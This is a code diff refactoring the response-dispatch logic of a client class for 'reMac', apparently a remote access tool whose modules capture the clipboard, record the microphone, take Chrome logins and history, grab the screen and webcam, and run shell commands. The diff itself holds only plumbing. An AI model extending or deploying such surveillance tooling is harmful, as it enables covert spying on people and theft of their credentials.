@@ -17,6 +17,25 @@ from apps.client.modules.mod_client_upload import mod_client_upload
 from apps.client.modules.mod_client_help import mod_client_help
 from apps.client.modules.mod_client_video import mod_client_video
 
+# global reMacClientModules
+# reMacClientModules = [
+#     mod_client_hello(),
+#     mod_client_clipboard(),
+#     mod_client_recmic(),
+#     mod_client_module_help(),
+#     mod_client_info(),
+#     mod_client_chrome_login(),
+#     mod_client_chrome_history(),
+#     mod_client_screenshot(),
+#     mod_client_webcam(),
+#     mod_client_shellcmd(),
+#     mod_client_download(),
+#     mod_client_upload(),
+#     mod_client_video(),
+#     mod_client_help()
+# ]
+
+
 class reMac_libclient(reMac_libbase):
 
     isShellCmdRunning = False
@@ -78,93 +97,102 @@ class reMac_libclient(reMac_libbase):
             else:
                 self._send_buffer = self._send_buffer[sent:]
 
+    def getModule4Cmd(self, cmd):
+        for md in self.reMacModules:
+            if md.cmd_short.startswith(cmd) or md.cmd_long.startswith(cmd):
+                return md
+        return None
+
     def _process_response_json_content(self):
         content = self.response
         result = content.get("result")
         action = content.get("action")
 
         # if self.isShellCmdRunning == True:
-
-        try:
-            result = json.loads(result)
-        except Exception:
-            pass
-        result = json.dumps(result, indent=4, sort_keys=True)
-        if action.startswith("mh"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "mh":
-                    return mod.run_mod(content)
-        elif action == "vd":
-            for mod in self.reMacModules:
-                if mod.cmd_short == "vd":
-                    return mod.run_mod(content)
-        elif action == "in":
-            for mod in self.reMacModules:
-                if mod.cmd_short == "in":
-                    return mod.run_mod(content)
-            # return self.reMacModules[action.split(" ")[0]][0].run_mod(content)
-        elif action.startswith("cb"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "cb":
-                    return mod.run_mod(content)
-            # return self.reMacModules["cb"][0].run_mod(content)
-        elif action.startswith("sc"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "sc":
-                    return mod.run_mod(content)
-            # return self.reMacModules["sc"][0].run_mod(content)
-        elif action.startswith("wc"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "wc":
-                    return mod.run_mod(content)
-            # return self.reMacModules["wc"][0].run_mod(content)
-        elif action.startswith("rm"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "rm":
-                    return mod.run_mod(content)
-            # return self.reMacModules["rm"][0].run_mod(content)
-        elif action.startswith("cl"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "cl":
-                    return mod.run_mod(content)
-            # return self.reMacModules["cl"][0].run_mod(content)
-        elif action.startswith("ch"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "ch":
-                    return mod.run_mod(content)
-            # return self.reMacModules["ch"][0].run_mod(content)
-        elif action.startswith("hw"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "hw":
-                    return mod.run_mod(content)
-            # return self.reMacModules["hw"][0].run_mod(content)
-        elif action.startswith("sh"):
-            # if(action == "sh"):
-            #     self.isShellCmdRunning = True
-            # else:
-            #     self.isShellCmdRunning = False
-                # if self.isShellCmdRunning == True:
-            for mod in self.reMacModules:
-                if mod.cmd_short == "sh":
-                    return mod.run_mod(content)
-            # return self.reMacModules["sh"][0].run_mod(content)
-        elif action.startswith("dl"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "dl":
-                    return mod.run_mod(content)
-            # return self.reMacModules["dl"][0].run_mod(content)
-        elif action.startswith("ul"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "ul":
-                    return mod.run_mod(content)
-            # return self.reMacModules["ul"][0].run_mod(content)
-        elif action.startswith("hp"):
-            for mod in self.reMacModules:
-                if mod.cmd_short == "hp":
-                    return mod.run_mod(content)
-            # return self.reMacModules["hp"][0].run_mod(content)
-        else:
+        mod = self.getModule4Cmd(action)
+        if mod is not None:
+            try:
+                result = json.loads(result)
+            except Exception:
+                pass
+            result = json.dumps(result, indent=4, sort_keys=True)
             print(f"got result: {result}, action: {action}")
+            return mod.run_mod(content)
+            # if action.startswith("mh"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "mh":
+            #             return mod.run_mod(content)
+            # elif action == "vd":
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "vd":
+            #             return mod.run_mod(content)
+            # elif action == "in" or action == "info":
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "in" or mod.cmd_long == "info":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules[action.split(" ")[0]][0].run_mod(content)
+            # elif action.startswith("cb"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "cb":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["cb"][0].run_mod(content)
+            # elif action.startswith("sc"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "sc":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["sc"][0].run_mod(content)
+            # elif action.startswith("wc"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "wc":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["wc"][0].run_mod(content)
+            # elif action.startswith("rm"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "rm":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["rm"][0].run_mod(content)
+            # elif action.startswith("cl"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "cl":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["cl"][0].run_mod(content)
+            # elif action.startswith("ch"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "ch":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["ch"][0].run_mod(content)
+            # elif action.startswith("hw"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "hw":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["hw"][0].run_mod(content)
+            # elif action.startswith("sh"):
+            #     # if(action == "sh"):
+            #     #     self.isShellCmdRunning = True
+            #     # else:
+            #     #     self.isShellCmdRunning = False
+            #         # if self.isShellCmdRunning == True:
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "sh":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["sh"][0].run_mod(content)
+            # elif action.startswith("dl"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "dl":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["dl"][0].run_mod(content)
+            # elif action.startswith("ul"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "ul":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["ul"][0].run_mod(content)
+            # elif action.startswith("hp") or action.startswith("help"):
+            #     for mod in self.reMacModules:
+            #         if mod.cmd_short == "hp" or mod.cmd_long == "help":
+            #             return mod.run_mod(content)
+            #     # return self.reMacModules["hp"][0].run_mod(content)
+            # else:
+            #     print(f"got result: {result}, action: {action}")
 
     def _process_response_binary_content(self):
         content = self.response
